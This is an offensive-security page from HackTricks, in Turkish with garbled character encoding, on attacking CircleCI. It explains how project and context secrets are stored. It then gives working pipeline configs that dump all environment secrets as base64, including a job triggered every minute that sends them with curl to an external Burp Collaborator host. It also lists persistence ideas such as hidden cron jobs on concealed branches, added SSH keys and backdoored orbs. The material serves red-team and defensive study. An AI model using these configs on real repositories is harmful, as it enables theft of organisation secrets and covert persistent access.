# CircleCI GÃ¼venliÄŸi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/), kodun ne yapÄ±lmasÄ±nÄ± ve ne zaman yapÄ±lmasÄ±nÄ± istediÄŸinizi belirten **ÅŸablonlarÄ± tanÄ±mlayabileceÄŸiniz** bir SÃ¼rekli Entegrasyon platformudur. Bu ÅŸekilde, Ã¶rneÄŸin **repo ana dalÄ±ndan doÄŸrudan testleri otomatikleÅŸtirebilir** veya **daÄŸÄ±tÄ±mlar yapabilirsiniz**.

## Ä°zinler

**CircleCI**, giriÅŸ yapan hesapla ilgili olarak github ve bitbucket ile ilgili **izinleri devralÄ±r**.\
Testlerimde, **github'deki repo Ã¼zerinde yazma izinleriniz olduÄŸu sÃ¼rece**, CircleCI'nin **proje ayarlarÄ±nÄ± yÃ¶netebileceÄŸinizi** (yeni ssh anahtarlarÄ± ayarlamak, proje api anahtarlarÄ±nÄ± almak, yeni CircleCI yapÄ±landÄ±rmalarÄ±yla yeni dallar oluÅŸturmak...) kontrol ettim.

Ancak, repo'yu bir CircleCI projesine **dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in bir repo yÃ¶neticisi** olmanÄ±z gerekmektedir.

## Ã‡evre DeÄŸiÅŸkenleri ve Gizli Bilgiler

[**Belgelere**](https://circleci.com/docs/2.0/env-vars/) gÃ¶re, bir iÅŸ akÄ±ÅŸÄ± iÃ§inde **Ã§evre deÄŸiÅŸkenlerine deÄŸer yÃ¼klemek** iÃ§in farklÄ± yÃ¶ntemler vardÄ±r.

### Dahili Ã§evre deÄŸiÅŸkenleri

CircleCI tarafÄ±ndan Ã§alÄ±ÅŸtÄ±rÄ±lan her konteyner her zaman [**belgelerde tanÄ±mlanan belirli Ã§evre deÄŸiÅŸkenlerine**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) sahip olacaktÄ±r, Ã¶rneÄŸin `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` veya `CIRCLE_USERNAME`.

### AÃ§Ä±k metin

OnlarÄ± aÃ§Ä±k metin olarak bir **komut iÃ§inde** tanÄ±mlayabilirsiniz:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
**Ã‡alÄ±ÅŸma ortamÄ±** iÃ§inde aÃ§Ä±k metin olarak bildirebilirsiniz:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
**build-job** ortamÄ±nda aÃ§Ä±k metin olarak bildirebilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
**Bir konteynerin ortamÄ±nda** aÃ§Ä±k metin olarak bildirebilirsiniz:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Proje SÄ±rlarÄ±

Bunlar, yalnÄ±zca **proje** tarafÄ±ndan **eriÅŸilebilen sÄ±rlardÄ±r** (herhangi bir **dal** tarafÄ±ndan).\
BunlarÄ±, _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ adresinde **bildirildiÄŸi ÅŸekilde** gÃ¶rebilirsiniz.

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye diÄŸer projelerden deÄŸiÅŸkenleri **iÃ§e aktarmaya** olanak tanÄ±r.
{% endhint %}

### BaÄŸlam SÄ±rlarÄ±

Bunlar, **org genelinde** olan sÄ±rlardÄ±r. **VarsayÄ±lan olarak herhangi bir repo**, burada depolanan herhangi bir sÄ±raya **eriÅŸebilecektir**:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Ancak, dikkat edin, **TÃ¼m Ã¼yeler** yerine farklÄ± bir grup seÃ§ilebilir ve sÄ±rlara sadece belirli kiÅŸilerin eriÅŸmesine izin verilebilir.\
Bu ÅŸu anda sÄ±rlarÄ±n gÃ¼venliÄŸini artÄ±rmak iÃ§in en iyi yollardan biridir, herkesin eriÅŸmesine izin vermek yerine sadece bazÄ± kiÅŸilere eriÅŸim izni vermek.
{% endhint %}

## SaldÄ±rÄ±lar

### AÃ§Ä±k Metin SÄ±rlarÄ±nÄ± Arama

EÄŸer **VCS'ye** (github gibi) **eriÅŸiminiz varsa**, her bir repo ve her bir dalÄ±n `.circleci/config.yml` dosyasÄ±nÄ± kontrol edin ve iÃ§eride depolanan potansiyel **aÃ§Ä±k metin sÄ±rlarÄ±nÄ± arayÄ±n**.

### Gizli Ortam DeÄŸiÅŸkenleri ve BaÄŸlam NumaralandÄ±rmasÄ±

KodlarÄ± kontrol ederek, her `.circleci/config.yml` dosyasÄ±nda kullanÄ±lan **tÃ¼m sÄ±r isimlerini** bulabilirsiniz. AyrÄ±ca bu dosyalardan veya web konsolunda _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ adresinde bunlarÄ± kontrol edebilirsiniz.

### Proje SÄ±rlarÄ±nÄ± DÄ±ÅŸarÄ±ya Aktarma

{% hint style="warning" %}
TÃ¼m proje ve baÄŸlam **SIRLARINI dÄ±ÅŸarÄ±ya aktarmak** iÃ§in, github org iÃ§indeki **yalnÄ±zca 1 repo'ya YAZMA** eriÅŸiminizin olmasÄ± yeterlidir (_ve varsayÄ±lan olarak herkes her baÄŸlama eriÅŸebilir_).
{% endhint %}

{% hint style="danger" %}
"**DeÄŸiÅŸkenleri Ä°Ã§e Aktar**" iÅŸlevi, bu projeye diÄŸer projelerden deÄŸiÅŸkenleri **iÃ§e aktarmaya** olanak tanÄ±r. Bu nedenle, bir saldÄ±rgan **tÃ¼m projenin deÄŸiÅŸkenlerini tÃ¼m repolardan iÃ§e aktarabilir** ve ardÄ±ndan **hepsini birlikte dÄ±ÅŸarÄ±ya aktarabilir**.
{% endhint %}

TÃ¼m proje sÄ±rlarÄ± her zaman iÅŸlerin ortamÄ±nda ayarlanÄ±r, bu nedenle env'i Ã§aÄŸÄ±rmak ve base64'te ÅŸifrelemek, sÄ±rlarÄ± **iÅŸ akÄ±ÅŸÄ± web gÃ¼nlÃ¼k konsolunda** dÄ±ÅŸarÄ±ya aktaracaktÄ±r:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ancak **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, sadece **her dakika tetiklenen bir iÅŸ akÄ±ÅŸÄ± oluÅŸturabilir** ve **sÄ±rlarÄ± harici bir adrese sÄ±zdÄ±rabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### BaÄŸlam SÄ±rlarÄ±nÄ± SÄ±zdÄ±rma

**BaÄŸlam adÄ±nÄ± belirtmeniz gerekmektedir** (bu aynÄ± zamanda proje sÄ±rlarÄ±nÄ± da sÄ±zdÄ±racaktÄ±r):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
EÄŸer **web konsoluna eriÅŸiminiz yoksa** ancak **repo'ya eriÅŸiminiz varsa** ve CircleCI'nin kullanÄ±ldÄ±ÄŸÄ±nÄ± biliyorsanÄ±z, sadece **her dakika tetiklenen bir iÅŸ akÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirebilir** ve **sÄ±rlarÄ± harici bir adrese sÄ±zdÄ±rabilirsiniz**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
YalnÄ±zca bir repo'da yeni bir `.circleci/config.yml` oluÅŸturmak, bir circleci derlemesini tetiklemek iÃ§in **yeterli deÄŸildir**. **Circleci konsolunda bir proje olarak etkinleÅŸtirmeniz gerekmektedir**.
{% endhint %}

### Buluta KaÃ§Ä±ÅŸ

**CircleCI**, derlemelerinizi **kendi makinelerinde veya kendi makinelerinizde** Ã§alÄ±ÅŸtÄ±rma seÃ§eneÄŸi sunar.\
VarsayÄ±lan olarak, makineleri GCP'de bulunur ve baÅŸlangÄ±Ã§ta ilgili bir ÅŸey bulamazsÄ±nÄ±z. Ancak, bir kurban **kendi makinelerinde (potansiyel olarak, bir bulut ortamÄ±nda)** gÃ¶revleri Ã§alÄ±ÅŸtÄ±rÄ±yorsa, **ilginÃ§ bilgiler iÃ§eren bir bulut meta veri uÃ§ noktasÄ± bulabilirsiniz**.

Ã–nceki Ã¶rneklerde her ÅŸey bir docker konteyneri iÃ§inde baÅŸlatÄ±ldÄ±, ancak aynÄ± zamanda bir VM makinesi baÅŸlatmak iÃ§in de **isteyebilirsiniz** (bu, farklÄ± bulut izinlerine sahip olabilir):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ya da uzaktan eriÅŸilebilen bir docker hizmetine sahip bir docker konteyneri bile olabilir:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### KalÄ±cÄ±lÄ±k

* CircleCI'da **kullanÄ±cÄ± belirteÃ§leri oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r, bÃ¶ylece kullanÄ±cÄ± eriÅŸimiyle API uÃ§ noktalara eriÅŸilebilir.
* _https://app.circleci.com/settings/user/tokens_
* Projeye verilen izinlere sahip olacak ÅŸekilde **proje belirteÃ§leri oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Projelere **SSH anahtarlarÄ± eklemek** mÃ¼mkÃ¼ndÃ¼r.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Beklenmedik bir projede **gizli bir dalda cron iÅŸi oluÅŸturmak** mÃ¼mkÃ¼ndÃ¼r, bu iÅŸlem her gÃ¼n tÃ¼m baÄŸlam ortam deÄŸiÅŸkenlerini **sÄ±zdÄ±racaktÄ±r**.
* Veya bilinen bir iÅŸi bir dalda oluÅŸturmak / deÄŸiÅŸtirmek ve her gÃ¼n tÃ¼m baÄŸlam ve **proje sÄ±rlarÄ±nÄ± sÄ±zdÄ±rmak** mÃ¼mkÃ¼ndÃ¼r.
* EÄŸer bir GitHub sahibiyseniz, **doÄŸrulanmamÄ±ÅŸ orb'lara izin verip** bir iÅŸte **arka kapÄ±** olarak yapÄ±landÄ±rabilirsiniz.
* BazÄ± gÃ¶revlerde bir **komut enjeksiyonu aÃ§Ä±ÄŸÄ±** bulabilir ve deÄŸerini deÄŸiÅŸtirerek bir **gizli** aracÄ±lÄ±ÄŸÄ±yla komutlar **enjekte** edebilirsiniz.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
